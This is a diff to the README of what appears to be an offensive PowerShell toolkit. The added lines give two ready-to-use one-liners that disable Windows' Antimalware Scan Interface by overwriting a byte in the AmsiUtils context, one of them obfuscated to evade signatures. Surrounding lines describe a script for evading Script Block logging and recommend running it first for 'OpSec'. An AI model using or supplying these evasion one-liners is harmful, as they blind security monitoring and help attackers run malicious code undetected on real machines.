@@ -79,6 +79,17 @@ PS > "amsiInitFailed"
 amsiInitFailed
 ```
 
+   - OH, by the way - you can grab **my custom AMSI evasion oneliners** below - perfect for a one-shot use cases:
+      * Technique 1A: Overwrite `AmsiUtils.amsiContext`'s object (`_HAMSICONTEXT.Signature`) byte. Length: 146 bytes.
+      ```
+      [Runtime.InteropServices.Marshal]::WriteByte((([Ref].Assembly.GetTypes()|?{$_-clike'*Am*ls'}).GetFields(40)|?{$_-clike'*xt'}).GetValue($null),0x5)
+   ```
+
+      * Technique 1B: Same as 1A, but obfuscated variant. (256 bytes)
+      ```
+      $h=[TyPE]('{5}{2}{4}{0}{3}{1}'-f'er','L','Un','viCes.maRShA','TIME.INTErOPS','r');Sv('W'+'e') ([tYpe]('{1}{0}'-f'EF','r'));(gET-vAriABLE h).vAlue::WriteByte((($wE.Assembly.GetTypes()|?{$_-clike'*Am*ls'}).GetFields(40)|?{$_-clike'*xt'}).GetValue($null),0x5)
+      ```
+
 - **`Disable-ScriptLogging.ps1`** - Tries to evade Script Block logging by leveraging couple of publicly documented techniqus, but in an approach to avoid signatured or otherwise considered harmful keywords. 
 
 *Warning:* This scriptlet should be launched first, before `Disable-Amsi.ps1` for better OpSec experience.
